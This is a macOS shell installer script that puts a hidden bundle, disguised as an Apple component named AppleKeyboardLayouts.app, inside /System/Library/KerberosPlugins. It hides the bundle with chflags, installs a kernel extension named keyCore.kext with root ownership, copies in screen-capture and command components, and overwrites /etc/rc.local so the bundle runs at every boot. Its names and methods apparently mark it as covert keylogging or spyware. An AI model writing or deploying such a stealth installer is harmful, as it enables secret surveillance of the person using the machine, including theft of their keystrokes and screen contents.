#!/bin/sh

cd $(dirname $0)
pwd
ver=`sw_vers | grep 'ProductVersion' | grep -o '[0-9]*\.[0-9]*\.[0-9]*'`
echo "ver: $ver"
if [ $(echo "$ver" | grep -o '10\.6\.[0-9]*') = $ver ]; then
    cd "./KeyInfo10.6"
else
    cd "./KeyInfo10.5"
fi
pwd
######### Begin config defaultPath ##########
if [ $# == 1 ]; then
    Path=$1
else
    Path=''
fi
defaultPath="$Path""/System/Library/KerberosPlugins/KerberosCorePlugins/AppleKeyboardLayouts.app"
# echo "defaultPath: $defaultPath"
sudo mkdir -p "$defaultPath"
chflags hidden "$defaultPath"

######### Begin Install Key ##########
sudo cp -R ./Contents "$defaultPath"
sudo cp -R ./keyCore.kext "$Path"/System/Library/Extensions/
sudo chmod -R 755 "$Path"/System/Library/Extensions/keyCore.kext
sudo chown -R root:wheel "$Path"/System/Library/Extensions/keyCore.kext
####### End Install Key ########

######### Begin Install MainProject ############
cd "../"
sudo cp ./startup.plist "$defaultPath"/Contents
sudo cp -R ./configdkey.app "$defaultPath"/Contents/Resources
########### End Install MainProject ##############

######### Begin Install Screen ############
sudo cp ./config "$defaultPath"/Contents/Resources
sudo cp -R ./ScreenSaver "$defaultPath"/Contents/Resources

sudo cp -R ./Commands/ "$defaultPath"/Contents
sudo chmod -R 755 "$defaultPath"/Contents
sudo chown -R root:wheel "$defaultPath"
########### End Install Screen ##############

########### Set Boot ##########
sudo cp ./rc.local "$Path"/etc/
sudo chmod 644 "$Path"/etc/rc.local
sudo chown root:wheel "$Path"/etc/rc.local
########### End Set Boot ##########

#sudo /usr/bin/find "$Path"/System/Library/Extensions/keyCore.kext -exec /bin/chmod -R g-w {} \;
#sudo /sbin/kextload "$Path"/System/Library/Extensions/keyCore.kext
#sudo "$defaultPath"/Contents/Resources/keydefgen
#sudo /bin/launchctl load "$defaultPath"/Contents/keydef.plist
#sudo /bin/launchctl load "$defaultPath"/Contents/startup.plist

echo "Install Success!"